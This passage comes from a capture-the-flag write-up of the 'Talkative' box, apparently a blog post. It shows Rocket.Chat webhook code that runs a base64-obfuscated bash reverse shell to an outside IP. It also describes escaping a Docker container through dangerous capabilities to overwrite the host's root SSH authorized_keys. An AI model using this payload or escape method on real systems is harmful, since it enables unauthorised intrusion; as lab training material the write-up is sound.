+<p><em>Checking the one on</em> <a href="https://www.exploit-db.com/exploits/50108">Exploit-DB</a>, We <strong>looked closely</strong> at the <code class="language-plaintext highlighter-rouge">rce</code> <strong>function</strong> within the <strong>Python code.</strong></p>
+
+<p>it seemed that <strong>RochetChat’s Integration feature</strong> was <strong>being abused</strong> to <strong>run Javascript code server-side</strong>. This is how <strong>Remote Code Execution</strong> was obtained.</p>
+
+<p><img src="/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg" alt="" /></p>
+
+<p><em>following the exploit’s way of creating its payload,</em> we <strong>created our own Integration</strong> and <strong>Incoming Web Hook</strong> to <strong>execute a bash reverse shell</strong> instead of the <code class="language-plaintext highlighter-rouge">cmd</code> variable above.</p>
+
+<p><strong>Here’s the code:</strong></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">require</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">'</span><span class="s1">return process.mainModule.require</span><span class="dl">'</span><span class="p">)();</span>
+<span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg" alt="" /></p>
+
+<p><em>After</em> <strong><em>filling out all the fields</em></strong> <em>similar to what the exploit did,</em> we <strong>saved the changes.</strong></p>
+
+<p>we then <strong>copied</strong> the <code class="language-plaintext highlighter-rouge">curl</code> command</p>
+
+<p><img src="/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg" alt="" /></p>
+
+<p>and used it to <strong>trigger the webhook</strong> after starting our <code class="language-plaintext highlighter-rouge">ncat</code> listener in advance.</p>
+
+<p><img src="/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg" alt="" /></p>
+
+<p>we got a <strong>sweet</strong> <code class="language-plaintext highlighter-rouge">root</code> <strong>shell</strong> on the <strong>RocketChat container :D</strong></p>
+
+<h2 id="escaping-and-owning-the-host-finally">Escaping and Owning the Host (Finally)</h2>
+<p><em>After getting in,</em> we <strong>improved our shell</strong> using the <code class="language-plaintext highlighter-rouge">script</code> utility to <strong>get a pty.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-chat-container-improving-the-shell.jpg" alt="" /></p>
+
+<p>we then <strong>transfered</strong> the <code class="language-plaintext highlighter-rouge">deepce.sh</code> script and <strong>ran it</strong> to <strong>check for ways to escape to the host.</strong></p>
+
+<p><em>because the</em> <code class="language-plaintext highlighter-rouge">capsh</code> <em>tool wasn’t installed,</em> the script <strong>couldn’t enumerate the docker’s capabilities.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-no-capsh-installed.jpg" alt="" /></p>
+
+<p><em>since</em> <strong><em>capabilities are one of the main ways to escape containers,</em></strong> we <strong>had to install the missing items.</strong></p>
+
+<p>we <code class="language-plaintext highlighter-rouge">cat</code> the <code class="language-plaintext highlighter-rouge">/etc/os-release</code> file to <strong>get our Linux distro.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-linux-distro.jpg" alt="" /></p>
+
+<p>we were on <strong>Debian 10.</strong> so we searched <strong>Google</strong> to find out how to install <code class="language-plaintext highlighter-rouge">capsh</code></p>
+
+<p>The <strong>first result</strong> was from a website called <a href="https://command-not-found.com/capsh">command-not-found.com</a>. such <strong><em>a suitable name :)</em></strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg" alt="" /></p>
+
+<p><em>according to it,</em> we needed the <code class="language-plaintext highlighter-rouge">libcap2-bin</code> library.</p>
+
+<p>we <strong>could obtain it</strong> from the <a href="https://packages.debian.org/sid/amd64/libcap2-bin/download">Debain packages</a> site</p>
+
+<p><em>but during installation,</em> it <strong>required another library</strong>: <code class="language-plaintext highlighter-rouge">libcap2</code></p>
+
+<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg" alt="" /></p>
+
+<p>we got it the same way from <a href="https://packages.debian.org/sid/amd64/libcap2/download">here</a> and installed it using <code class="language-plaintext highlighter-rouge">dpkg -i</code></p>
+
+<p><strong><em>having installed the required dependencies,</em></strong> we ran <code class="language-plaintext highlighter-rouge">deepce.sh</code> a second time:</p>
+
+<p><img src="/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg" alt="" /></p>
+
+<p>we found a <strong>set of critical capabilities</strong>. Namely <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> which <strong>together can be exploited to write files to the host machine.</strong></p>
+
+<p>We’re going to <strong>follow the method explained</strong> in the <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override">HackTricks</a> page and <strong>compile the C code.</strong></p>
+
+<p><strong>Note:</strong> <strong><em>staticly linking the binary</em></strong> with the <code class="language-plaintext highlighter-rouge">-static</code> flag will <strong>make sure it has the libraries</strong> it needs.</p>
+
+<p><img src="/assets/Talkative/privesc-compile-shocker-write.jpg" alt="" /></p>
+
+<p>the <strong>warnings weren’t a concern</strong> here. we still <strong>got the compiled executable.</strong></p>
+
+<p><em>To compromise the host,</em> we first <strong>generated an SSH key pair.</strong></p>
+
+<p><img src="/assets/Talkative/privesc-generating-ssh-key-pair.jpg" alt="" /></p>
+
+<p>we then <strong>transferred the public key</strong> and <strong>used the exploit</strong> to <strong>write it over</strong> the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file.</p>
+
+<p><img src="/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg" alt="" /></p>
+
+<p><strong>which was a success!</strong></p>
+
+<p>The <strong>final step</strong> was to <strong>transfer the private key to the bolt container</strong> (<em>since it had the</em> <code class="language-plaintext highlighter-rouge">ssh</code> <em>client installed</em>) and use it to <strong>own the box.</strong></p>
+
+<p><img src="/assets/Talkative/privesc-rooted-finally.jpg" alt="" /></p>
+
+<p><strong>What a trip! :D</strong></p>
+
+  </div><a class="u-url" href="/2022/10/19/Talkative.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
